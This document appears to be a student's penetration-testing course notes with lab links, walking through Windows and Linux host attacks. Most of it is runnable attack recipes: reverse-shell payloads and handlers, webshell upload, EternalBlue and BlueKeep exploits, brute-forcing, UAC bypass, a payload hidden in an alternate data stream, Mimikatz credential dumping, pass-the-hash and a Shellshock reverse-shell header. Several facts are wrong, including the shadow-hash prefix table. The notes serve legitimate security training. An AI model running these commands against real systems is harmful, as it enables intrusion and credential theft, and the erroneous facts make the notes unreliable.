  

- ==_**`nmap --script vuln <ip>`**_==

  

  

> ==System/Host based attack== ⇒ the attack targeted towards a specific system or host running specific os

> Usually come in to play after you have gained access to target network

  

> host attack need understanding of os and the os vulnerability that affect side the os

  

# ==**windows vulnerability**==

  

> when u download a fresh windows that not configured to be secure as default , so without the security polices from the company and a endpoint security , install antiviruses , performing patch management , the windows is not secure

  

- ==**Types of windows vulnerability**==
    
    1. information disclosure
    2. BufferOver Flow ⇒ typically caused by a programing errors that essentially allows attacker to write data to a buffer and overrun the allocated buffer consequently writing data to allocated memory addresses
    3. Remote Code Execution
    4. Privileges escalation
    5. Dos Attack
    

  

- ==Frequently exploited windows services==

  

  

### ==Exploiting Microsoft IIS WebDAV==

  

> ==IIS== ⇒ ==internet information services== ⇒ it’s a web server software that developed by microsoft to use with windows NT family . u can set up to host asp or php application .

  

> ==webDAV== ⇒ ==stands for web-based distributed authoring and versioning== ⇒ it’s enables a web-server like IIS to function as a file server for collaborative authoring

  

- _**Nmap to scan about IIS WebDAV & Davtest & Cadaver**_ ( if we use basic nmap and see we have iis webdav )
    
    - `==_**nmap -sV -p 80 - -script=http-enum <ip>**_==` ⇒ to tell us what is the WebDAV directory and what is configured on this web server .
    
    > now with the nmap command if that return with the directory , but these directory need authorization , u can use always u can use ==**_hydra_**== for any brute force u need , if that is username and password form by the browser u can use it ⇒
    
    - ==**_`hydra -L /usr/share/worldlist/metasploit/common_username.txt -P /usr/share/worldlist/metasploit/common_password.txt <ip> http-get <directory>`_**==
    
      
    
    > so now if we can access , what we can do , we should remember the webdav used to upload download file from the directory as well as modify or delete files , so how do that ??? now it’s time for ==**_davtest ⇒_**== **_it’s tool used to test for what type of file u can upload ,download and what type of file u can_** ==`**_execute_**`==
    
      
    
    - `**_davtest -auth <username>:<password> -url <url with dir>_**` ⇒ that will return with what file can execute and upload
    
    > so now after we know what type of file we can upload and execute , how to do that , so it;s time to ==**_cadaver_**== ⇒ **_==it’s used to upload,delete,download,execute .==_**
    
      
    
    - `cadaver <url with dir>`
    
    1. ==`**_enter the username and the password_**`== ⇒ after the prev command that will promet needed u to enter the auth crad
    2. now will open shell on the server u can do what do u want ⇒ ==`ls , cat …etc`==
    3. ==`put /usr/share/webshells/asp/webshell.asp`== ⇒ that to upload asp webshell on the server ( u have all webshell u ned in /usr/share/webshells)
    4. after this u can return to browser and open the asp webshell , and ==`enter your command in the box`== , and u can find the flag on c , u can cat it using (type ⇒ like cat on linux) ⇒ ==`type C:\flag.txt`==
    
      
    
    - **Windows: IIS Server DAVTest LAP**
    
    https://drive.google.com/file/d/1e8S6ScVRvuyq5Uypw18jL3MeO0spomrK/view?usp=sharing
    
      
    
      
    

  

- _**Metasploit to scan WebDav**_
    
    > it’s same as a nmap , but here not any asp payload work , sometimes u need to generate a payload to work with ==**_msfvenom_**== ⇒ it’s Metasploit tool use to generate a webshell payload ⇒
    
    - ==**_`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<OUR IP> LPORT=1234 -f asp >shell.asp`_**== ⇒ thats will generate a metepreter payload on asp to execute a revirceshell
    - **_==`put /root/shell.asp`==_** ⇒ using cadaver
    
    > before we enter it , we should setup a listener or a handler that receive the revers shell (connoction ) and to make a metepreter session when executed
    
    - **==`service postgresql start && msfconsole`==** ⇒ that because the Metasploit need the the metasploit database to run
    - use multi/handler ⇒ to set payload that will execute and revers on it
    - `**==set payload windows/meterpreter/reverse_tcp==**` ⇒ to set the payload the same payload we used with msfvenom
    - ==_`set LHOST <our ip> && set LPORT 1234`_==<the port we use>
    
    > then will start listener wait the connection from our shell (asp payload that we upload it on the sever)
    
    > ==so now if we open the shell file on browser , we will see the payload executed and ⇒ if we back to the terminal to the listener that we make we can see we gain access and we can now run any command==
    
      
    
    - search IIS upload ⇒ ==_**we have a script do entire procces , when u do search u will find alot of payload , so copy tha path of asp**_==
    - use exploit/windows/iis/iis_webdav_upload_asp
    
    > the payload will be the defult
    
    - _==now u should enter what u need like username and password for the webdav ,and the target ip==_
    
    > ==will make it and upload and make a shell , the delete it for detection==
    
      
    
    - **Windows: IIS Server: WebDav Metasploit**
    
    [2319 - Windows: IIS Server: WebDav Metasploit (ine.com)](https://assets.ine.com/labs/ad-manuals/walkthrough-2319.pdf)
    
      
    
      
    

  

  

### ==_Exploiting SMB With PsExec_==

  

> ==_SMB (server Massage Block )_== ⇒ is a file sharing protocol used to share file , printers , set up a file or foulder share where other computers on that particular local area network can access it .

> when u search if u find another protocol called ==**_samba_**== ⇒ it’s a open source linux implementation of SMB is used to allow windows system to access linux shares and devices .

> `SMB is protocol on windows` , `samba is linux implementation on linux`

  

> ==_SMB has a 2 level for auth_== ⇒ 1. `user auth` ⇒ u must enter the username and the password 2. `share auth` ⇒ u must enter the password to access the share .

  

  

- `_PsExec_` ⇒ is a lightweight telnet-replacement developed y Microsoft , to control the share file , like the RDP , so it’s remote access with the server and u can run command and open shell .. etc , it’s like the remote access (GUI) but here it’s developed to run by CMD .

  

- After u do a Bruteforce the username and password of SMB using Metasploit ⇒

1. use auxiliary/scanner/smb/smb_login
2. set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
3. set user_file /usr/share/metasploit-framework/data/wordlists/unix_password.txt
4. so now we know what the username and the password is , so using `PsExec`
5. _`[psexec.py](http://psexec.py)`_ _`<username>@<targert ip> <command ⇒ cmd.exe>`_ _⇒ that’s will make cmd.exe file , open the service manager , make a new service , and upload it on the smb server then execute it and provide u with a shell on the target system ._
6. u can use _`exploit /windows /smb/psexec`_ , on Metasploit , that will let u auth on the server with the crad , then the Metasploit will make a Meterprter payload and upload it on the server and back with a Metepreter session .

  

- _**Windows: SMB Server PSexec LAB**_

https://drive.google.com/file/d/1a2K_GVUyvC22Q_i14gSNZ2DlOk7NdoeW/view?usp=sharing

  

  

### Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)

> ==**_The EternalBlue_**== ⇒ is a name given to a collection of many vulnerabilities that take advantage of smb version one , let u send a a rce and gain access to the entir system and the network .

  

- Nmap and manual exploit
    
    1. _`nmap -sV -p 445 —script=smb-vuln-ms17-010 <ip>`_ ⇒ to check if the target is vuln or not
    
    > `Now we need to clone a repository of AutoBlue-Ms17-010` , that contain a python script to exploit that
    
    1. `chmod +x shell_prep.sh && ./shell_prep.sh`
    2. let it generate a revers shell by msfvenom ⇒ `y`
    3. `LHOST ⇒ <our ip>` && `LPORT ⇒ 1234` && `(1 ⇒ metepreta shell OR 0 ⇒ regular cmd shell )` && `if we do ls we will see the shell file`
    4. `nc -nvlp 1234` ⇒ to open netcat and listner
    5. step back and return to the python script and , `chmod +x eternalblue_exploit<ver>.py`
    6. `python3 eternalblue_exploit<ver>.py <target ip> <shell file from step 4>`
    7. on netcat we will recive a conniction and 😎
    
      
    
      
    

  

- Metasploite and automatic exploit
    
    - `msfconsle` && `search enternalblue ( the aux or the exploit)`
    - `set RHOST ⇒ target ip` && enter ⇒ that will make a meteprater session
    - so well done and we make a rce 😎
    
      
    

  

### Exploiting RDP ( Remote Desktop Protocol )

> Is Gui remote access protocol used to remotely connect and interact with windows system

> Is on Port 3389 as defult

> Rdp maybe configerd on another port

  

- ==_Exploiting RDP_==
    
    1. `_nmap -sV <ip>_` ⇒ to scan for open ports
    2. `msfconsole` && `use auxiliary/scanner/rdp/rdp_scanner` && `set rhost <target ip >` && `set rport < to port that u expect that carry rdp >` ⇒ that use when we dose not know what that port is , and we expected it as a rdp
    3. `hydra -L /usr/share/metasploit…./wordlists/common_user.txt -P /usr/share/metasploit…./wordlists/unix_password.txt rdp://<target ip> -s <if it configerd on the another port than the defult>` ⇒ to bruteforce the rdp
    4. `xfreerdp /u:<username> /p:<the password> /v <target ip>:<port>` ⇒ to open rdp and 😎
    
      
    
      
    
      
    

  

- _==Exploiting Windows CVE-2019-0708 RDP Vulnerability (BlueKeep)==_
    
    > Rce lead to connect to rdp , utilizes attackers to gain access to chunk of kernal memory through this vuln , this chunk where the millic code , the kernel is privileged , the attackers on kernel leads to system crash
    
    1. `_nmap -sV <ip>_` ⇒ to scan for open ports
    2. `msfconsole` && `use auxiliary/scanner/rdp/cve_2019_0708_bluekeep` && `set rhost <target ip >` && `set rport < to port that u expect that carry rdp >` ⇒ to chek if the target is vuln
    3. `msfconsole` && `use exploit/windows/rdp/cve_2019_0708_bluekeep` && `set rhost <target ip >` && `set rport < to port that u expect that carry rdp >` && `set lhost <your ip>` && `set lport 1234` && `set target <windows ver>` ⇒ to exploit this vuln
    
    > if the chunk grooming u will expolited that will lead the system to crash and the data will losse
    
      
    
      
    

  

### Exploiting WinRM ( windows remote management protocol )

> is feature on windows , so it’s not enable by defult , so that should be runned and configerd by the admin of system

> used to facilitate remote access with windows systems over http or https

> when that configuring the network . they can configure every windows host on that network

> can be found on tcp port 5985 or 5986

> the authentication on it , username:password or username:password_hash

  

- ==_WinRM: Exploitation with crackmapxec_==
    
    1. `nmap -sV -p 5985,5986 <target ip>` ⇒ to scan if it enable
    2. ==_`crackmapxec`_== _`winrm <protocol> <target ip> -u administrator <or wordlist> -p /usr/sahre/metasploit…/data/wordlists/unix_password.txt`_ ⇒ that will let us to crack the password of the user
    3. ==_`crackmapxec`_== _`winrm <protocol> <target ip> -u administrator`_ `_-p <password that we found> -x “<command u want to exucute>_` _⇒_ to run command on the system
    
      
    

  

- ==_WinRM: Exploitation with ruby script_==
    
    1. `_evil-winrm.rb -u administrator -p '<the password that we found in crackmapexc>’ -i <target ip>_` _⇒_ to get a command shell session
    
      
    
      
    
      
    

  

- ==_WinRM: Exploitation with metasploit_==
    
    1. `msfconsole`
    2. `use exploit/windows/winrm/winrm_script_exec`
    3. `set rhost <target ip>` && `set force_vbs true` && `set username administratore` && `set password <password we found in crackmapxec or use wordlist >`
    4. `run` or `exploit`
    

  

  

## **Windows Privilege Escalation ( Section 2 )**

> is that way to elevate my privileges form the basic user to administrator or obtain NT authority system privileges

> The kernel is a computer program that is the core of os and has a complete control over every resources and hardware .

> The windows os come with kernel called windows NT

- Privilege escalation on windows will typically follow 2 steps :

1. ==_identifying kernel vulnerabilities_== ⇒ see what the kernel i sholud attack and who its work …. etc
2. ==_Downloading , compiling and transferring kernel exploit onto target system ._== 😉

  

- ==**_Windows Kernel Exploits_**==
- _The Tools can be found in this 2 repo_ ⇒ `Windows-Exploit-Suggester` && `Windows-Kernel-Exploit`

  

- ==**_Windows Kernel Exploit with metasploit && Scripts_**==
    
    1. `_First u should identify what the privileges u have and what u can do and what u can’t_` ( that will be if u are in the shell code or meterpreter session
    2. Then search in metasploit to `post/multi/recon/local_exploit_suggester` && `run` ⇒ that will enumerate all vuln within this version of windows that let u escalation your Privilege , just pick one and goess on
    3. select what exploit u want and type option to set the attribit
    4. then we will type a `systeminfo` command and copy the info , it’s critical info
    
    > _know with Scripts_
    
    1. now clone the repo of _Windows-Exploit-Suggester_ , then `./Windows-Exploit-Suggester.py --update`=> to installe the latest version of database
    2. `./Windows-Exploit-Suggester.py --database <databases file > --systemifo <systeminfo text file>` ⇒ that will generate a many type of exploit u can use
    3. now when u see the result of step 2 and what the type of exploit u can see
    4. go to `Windows-Kernel-Exploit` repo , and search for the type u want then download the exploit
    5. then navigate the temp file on the target system ⇒ ==_to not be detected by the user of the system owner_==
    6. now upload the exploit in this directory
    7. now navagite the file , and run it using `=> ./<filename> <windows ver (7,8,12)>`
    8. after this is done u can see whoiam and u will see u are the admin now ;)
    
      
    
      
    
    - ==**_Bypassing UAC With UACMe_**==
    
    > UAC (User Account Control ) ⇒ do u know the tab that pop up when u change somting in app , that pop up like this , do u want to make this app or allow this app to make change on your system v, that is
    
    > is used to ensure that the changes is done by the admin or user owner , and approved of it
    
    > to bypass the usc , u will need to have access to a user account that is part of the local administrators group to windows target system , because if u are not part , that will pop up a box like the UAC but now it’s ask for admin password
    
      
    
    - ==Bypass the UAC==
        
        1. ==_now after we find a way to rce on the target system like the previuse ways of rce_==
        2. now we need to identify the version of windows that we are targeted ⇒ `sysinfo`
        3. then we should see if we part of local administrators group by ⇒ `getuid` & `getprivs` && `shell` ⇒ `net localgroup administrators`
        
        > now if we want to change the password of a user we will see access ids denied , because we should click on the accept on the UAC , but we are now in command promet so we can’t
        
        1. now clone the UACME repo that contain a lot of method of bypassing the UAC
        2. ok now we want to make a msfvenom ⇒ `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<our ip> LPORT=1234 -f exe > backdoor.exe`
        3. now listner of the payload ⇒ `msfconsle` && `use multi/handler` && `set payload windows/meterpreter/reverse_tcp` && `set lhost <our ip>` && `set lport 1234` && `run`
        4. now in the meterpreter session ⇒ `cd c:\\` && `mkdir temp` && `upload backdoor.exe` && `upload /root/desktop/tools/UACME/Akagi64.exe`
        
        > now we upload the akagi64.exe on the target system and now we will use it to bypass the UAC
        
        8 . `./akagi64.exe <key ( see the repo to select a key) 23 > c:\\temp\backdoor.exe`
        
        1. ==_now if we back to msfcosle we will see the session closed and the new one opend so , now if we type getpriv we will see alot of that and now we bypass the UAC ⇒_== `==migrate <number of proccess that need authourity pricv==`
        
          
        
    
      
    
      
    
    - ==**_Access Token Impersonation_**==
    
    > **Access Token Impersonation** are the core element of the authentacation proccess of windows and are created and managed by the local security authority subsystem service (LSASS) .
    
    > is responseabil for identifying and discribing the security context of a process of thread running on a system
    
    > ==_it’s like a cookies on web , like a key , we use it when we want to access something without the needed of providing the password each time ._==
    
    > ==_**when we want to access or login in user the winlogin.exe promet to us and need us to provide the username and the password , so when we enter it and login we will see the winlogin.exe generate a access token , now this token is attached to the userinit.exe proccess after the child process create by the user , it copy this token and init it in the subprocess , so u dose not needed to provide a login crad every time u want to start a process**_==
    
    > ==SeAssignPrimaryToken== ⇒ allows a user to impersonate tokens . ==SaCreateToken==⇒ allows a user to create and arbitrary token with administrative privileges . ==SelmpersonatePrivilegs== ⇒ allows a user to create a process under the security context of another user typically with administrative privileges .
    
      
    
    > ==_Delegation Tokens_== ⇒ direct result of an interactive logon . ==_Impersonation Tokens_== ⇒ direct result of a non-interactive logon .
    
      
    
    - ==**_Access Token Impersonation_**==
        
        1. ==_now after we find a way to rce on the target system like the previuse ways of rce_==
        2. when we acsess we can see we have a few privileges , one of them is `seImpresonatePrivilege` ⇒ that will allow us to exploit it
        3. now we will use ⇒ `load incongnito` ⇒ that will closed the meterprter session and load another one
        4. `list_tokens -u` ⇒ that will display the users tokens
        5. now we will see that we have a ==_Delegation Tokens && Impersonation Tokens_== ⇒ one of the delegation tokens is a administrator
        6. `impersonate_token “<name of the admin token>”` ⇒ to impersonate the admin token
        7. `pgrep explorer` && `migrate <numer of process>`
        8. now we will see that we are get the admin token if we getprivs ⇒ we will see we have extra privilege
        9. now if we list token of users ⇒ `list_tokens -u`
        10. ==we will see all the tokens included the authority token==
        
          
        
    
      
    
    ### **Windows File System Vulnerabilities**
    
      
    
    - ==_Allternate Data Streams_==
    
    > ==_Alternate data streams (ADS)_== ⇒ is an NTFS (new technology file system ) file attribute and was designed to provide compatibility with the macOS HFS (Hierarchical file system)
    
    > Any any file u created or downloaded have follow tow different forks/streams : 1. ==_Data Stream_== ⇒default stream that contains a data 2. ==_Resources stream_== ⇒ typically contains a metadata
    
    > if i have malicious payload , with ADS i can hide the payload on the metadata of the file on the Resources stream , so when i run any file with this meatadata the payload will execute .
    
      
    
    - ==_Exploit the Allternate Data Streams_==
        
        1. now if we creat any file like test.txt , and open it and write “ hi this is a test file “ .
        2. now here the text within the file (”hi this is a test file “) is the ==_Data Stream_== , if we right-click on it and choses propartese & detiles ⇒ we can see the metadata , so this is a ==_Resources Stream_==
        3. now if we open the command promet , and type notepad test1.txt:secret.txt ⇒ that’s will create a _test1.txt file and in resources of the test1 file it will be the secrat.txt_ , so if we open the test1.txt we will see the file did not have any data on it , ==_but in resource stream we have the secrat file_== .
        4. so if we have a payload.exe , we want to put the output of this payload in .exe file and hidden it on the another text file ⇒ `**_type payload.exe > windowslogs.txt:winpise.exe_**`
        
        > ==_That will put the output of the execution of the payload file into the winpise.exe and hidden the winpise.exe in resources stream of the windowslogs.txt file ._==
        
        1. Now we can make a symbolic link , so when we navigate the symbolic the payload will execute ⇒ _`==mklink winupdate.exe c:\\Temp\windowslogs.txt:winpise.exe==`_
        
        > that will create a symbolic link that refera to the windows update file , so when i type a command or open the file winpdate.exe the payload will execute .
        
        1. now if we type the command ⇒ winupdate.exe , we will see the winpise.exe file execute and start to enum the windows .
        
    
      
    
      
    
    ### ==_**Windows Credential Dumping**_==
    
      
    
    - ==**Windows Password Hashes**==
    
    > Windows store the users password hashed on SAM database (security account manager database)
    
    > SAM DataBases (security account manager) is a database file that responspel for managing user account and password on windows , all users password stored hashed
    
    > LSA ( local security authority)
    
    > LM (LanMan) ⇒ is the defult hash algorthem that used in windows operating system , all 7 char chunks in password is in upper case ,
    
    > as we see the password spilt to 2 chunks , each chunks is 7 upper case char , then with DES algorthem , then provided us with to hashes in LM hash
    
      
    
    > NTLM (NTHASH) ⇒ is colloction of authentication protocols that are utilized in windows to facilitate authentication between computers , is use MD4 ⇒ dose not spilt the password to 2 chunks , is case sensitive
    
    > the configration file in windows called ⇒ Unattend.xml or Autounattend.xml
    
      
    
    - ==_Searching For Passwords In Windows Configuration Files_==
        
        1. now we need first to gain access to the target system by using any exploit that target this windows
        2. First we need to gain access to the target windows system ⇒ `msfvenom -p windows/x64/meterpreter/revers_tcp LHOST=<your ip> LPORT=1234 -f exe >payload.exe`
        3. now open a python http server ⇒ `python -m SimpleHTTPServer 80`
        4. now in windos target system we need to transfer the payload ⇒ `certutil -urlcache -f http://<your kali ip>/payload.exe payload.exe`
        5. `msfconsole` && `use multi/handler` && `set payload windows/x64/meterpreter/revers_tcp` && `set lhost <your ip >` && `set lport 1234`
        6. now open the payload in windows target system
        7. now search for Unattend.xml ⇒ in meterpreter session ⇒ `search -f Unattend.xml` then downl7oad it
        8. now in bottom of the file u will see the username and the password , so copy the password and put it in new file , then ⇒ `base64 -d password.txt` , u will see the password in clear text
        9. now using `[psexec.py](http://psexec.py)` `Username@targetip , then enter the password`
        
          
        
          
        
          
        
          
        
    
      
    
    - ==_Dumping Hashes With Mimikatz_==
        
        1. we need to gain access to the target system first
        2. now let’s find the lsass process ⇒ `pgrep lsass` , we will see the process number is 788
        3. now let’s use the Kiwi model to dump the crad ⇒ `load kiwi` && `?` < to see the help menu>
        4. now after u dump the all crad , u might see the ntlm hash , and the syskey , and all info that may be useful
        5. now let’s use Mimikatz tool ⇒ first we need to upload the mimikatz.exe in target system ⇒ `upload /usr/share/windows-resources/mimikatz.exe ⇒ mimikatz.exe`
        6. now open shell then execute the mimikatz.exe , then first we need to check the privilege we have ⇒ `privilege::debug` , if the response 20 ok we have the right privilege
        7. lsadump::sam ⇒ to dump the lsa cache
        8. one of the important thing we can do with mimikatz is ( every time the user login in the system the memory store the password in clear text so using mimikatz u can dump that ) ⇒ `sekurlsa::logonpassword`
        
        - ==_now let’s Pass-The-Hash Attacks_==
        
        > pass the hash attack ⇒ is exploitation technique that involves capturing or harvesting NTLM hashes or clear-text password and utilizing them to auth with the target system
        
        1. now after we get the hash form the prev
        2. now first u need the Lm hash to optain the ntlm hash , u can get the lm hash from the `hushdump` in target system
        3. now use this in msfconsole ⇒ `use exploit/windows/smb/psxec` && `set RHost <target ip>` && `set SMBUser Administrater` && `set SMBpass < the hash we copy it >` && `set target <target u want>`
        4. we can use crackmapexec ⇒ `crackmapexec smb <target ip> -u Administrater -H “ <Ntlm hash>" -x "<command u want to run>"`
        
          
        
          
        
          
        
    
      
    
      
    
    # ==Linux== ==**vulnerability**==
    
      
    
    > Linux ⇒ is Free and open source operating system ,is commonly referred to GNU/Linux
    
    > GNU Tool Kit ⇒ like ls , cd , rm …. etc
    
    > Telnet on port 23 , SSh on port 22 , The defense about them that the SSh support authntacaion ( username & password and key bassed )
    
    > The linux disruption based on what do u want , as a example we have a _==kali linux is designed for penetration tester and red teamer==_ , _==Ubentu is designed for any one want to use linux==_ ..etc
    
    - **Exploiting Linux Vulnerabilities**
    
      
    

- ==_Exploiting Bash CVE-2014-6271 Vulnerability (Shellshock)_==

- ==_Exploit ShellShock_==
    
    1. first we need a nmap scan to obtain what the services running on the ip ⇒ `nmap -sV <ip >`
    
    > now we are locking for a apache web server , once we found it , now if we open it in new browser , we will see that the website display the current time based on your time , so this is a dinamical thing and it’s relly look like it a server side , so this can be happen througe CGI Script , that what we want
    
    1. `namp -sV <target ip> - - script=http-shellshock - -script-args “http-shellshock.uri=/<Cgi script dir or path>”` ⇒ to scan if target is vuln to shellshock or not
    
    > when we see it’s vuln now we want to inject a spical char in user agent , then the command we want to execute
    
    1. ==_now open burp and intrcept the cgi script request , send it to repeter_==
    2. now modify the user agent to ⇒ `() { :; }; echo; echo; /bin/bash -c '< command>'`
    3. as a example we will run the etc/passwd ⇒ ==_() { :; }; echo; echo; /bin/bash -c ‘cat /etc/passwd’_==
    4. now let’s make a revers shell ⇒ `nc -nvlp 1234`
    5. now in burp modify the user agent to ⇒ `_() { :; }; echo; echo; /bin/bash -c ‘bash -i>&/dev/tcp/<ip:1234> 0>&1’_`
    
    - now authomatic using msfconsole
    
    1. `msfconsole` && `search shellshock`
    2. `use auxilaiary/scanner/http/apache_mod_cgi_bash_env` ⇒ to scan if the target system vuln or not
    3. `use exploit/multi/http/apache_mod_cgi_bash_env_exec` && `set rhosts <target ip>` && `set targeturi <cgi script path>` && `run`
    

  

  

- ==_**Exploiting FTP**_==

> Ftp stand for a file transfer protocol on 21 by default is used to facilitate file sharing between a server and clinet/clients . && it is used to transfer file to and from the dirctory of a web server

> in some case the FTP server may be configured to allow anonymous access which allow user to access it without credentials.

  

- ==**Exploit FTP using brute-force attack**==
    
    1. `nmap -sV <target ip>`
    2. `ls -al /usr/share/nmap/scripts/ | grep <what u want>*` ⇒ to see what the script u have on nmap u can use
    3. `hydra -L /usr/share/metasploit-freamwork/data/wordlist/common_users.txt -P /usr/share/metasploit-freamwork/data/wordlist/unix_password.txt < target ip> -t 4 ftp` ⇒ to brute-force the ftp login
    
      
    
    > ==`**_searchsploit <servese>_**`== ⇒ to search for exploit on ExploitDB
    
      
    

  

  

- ==**_Exploiting SSH_**==

> SSH stand a secure shell ⇒ is a remote administrater protocol that offers encryption and is the seccessor to telnet

> on port 22

> the 2 auth way to login ⇒ enter the username and password , the seconed way is the key-based ⇒ this happen through the public key on the server , and the privet key u have and used to gain access and remotly access the system

  

- ==**_Exploit ssh using brute-force attack_**==
    
    1. `nmap -sV <target ip>`
    2. `hydra -L /usr/share/metasploit-freamwork/data/wordlist/common_users.txt -P /usr/share/metasploit-freamwork/data/wordlist/common_password.txt < target ip> -t 4 ssh`
    3. ssh <username>@<target ip> , then enter the password
    
      
    
      
    

  

  

- ==_**Exploiting SAMBA**_==

> SMB ( server message block) is a network file sharing protocol that is used to facilitate the sharing of files and perpherals between computers on a local network (LAN)

> on port 445 , ran on top NetBios using port 139

> So samba is the linux implementation of SMB , that is allow windows system to access linux shares and devices .

  

- ==_Exploit Samba using brute-force attack_==
    
    1. `namp -sV <target ip >`
    2. `hydra -L admin -P /usr/share/metasploit-freamwork/data/wordlist/unix_password.txt < target ip> -t 4 smb`
    3. _==then u can use smbclinet or smbmap to gain access==_
    
      
    

  

  

## Linux Privilege Escalation

### Linux Kernel Exploits

> 1 - Identifying Kernal Vulnerabilities 2 - Downloading , compiling and transferring kernal exploit onto target system

- **_==Linux-Exploit-Suggester==_** ⇒ is used to assist in detecting security deficiencies for linux machine , it’s suggest a exploit for your target ==**_`http:://github.com/mzet-/linux-exploit-suggester`_**==

1. when u download the tool , u will find it called [les.sh](http://les.sh)
2. then we should upload it to the target system
3. now we will run it like this , ./les.sh , then it will provied u with a suggestion of the exploit u can make to become a root
4. in first line of the tool result u will see 3 parameter , one of the most important part of the exploiting process

> _`Kernal version`_ , _`Architecture`_ , _`Distribution`_ , _`Distribution version`_

1. ==now select the exploit u want and do it==

  

**==Exploiting Misconfigured Cron Jobs==**

  

  

==**_Exploiting SUID Binaries_**==

  

  

  

### **Linux Credential Dumping**

  

- ==_Dumping Linux Password Hashes_==

> on linux we know that all account information is stored on `/etc/passwd`

> the shadow file is just can be display on privilege account (root permission) , it’s contain all hash value for the accounts on the system ( Encrypted Linux account passwords ) ⇒ `/etc/shadow`

> if we do a privilege escalation , then display the contant of the shadow file , we will see the username then a `$<number >` ⇒ this related to the hashing algortem that used so if u see ⇒

`$1 ⇒ it’s a MD5`

`$2 ⇒ it’s a Blowfish`

`$3 ⇒ it’s a SHA-256`

`$4 ⇒ it’s a SHA-512`

  

==_Exploit Dumping Linux Password Hashes_==

[

https://assets.ine.com/labs/ad-manuals/walkthrough-1776.pdf?_ga=2.129561292.1319801729.1687020959-877444616.1677416783



](https://assets.ine.com/labs/ad-manuals/walkthrough-1776.pdf?_ga=2.129561292.1319801729.1687020959-877444616.1677416783)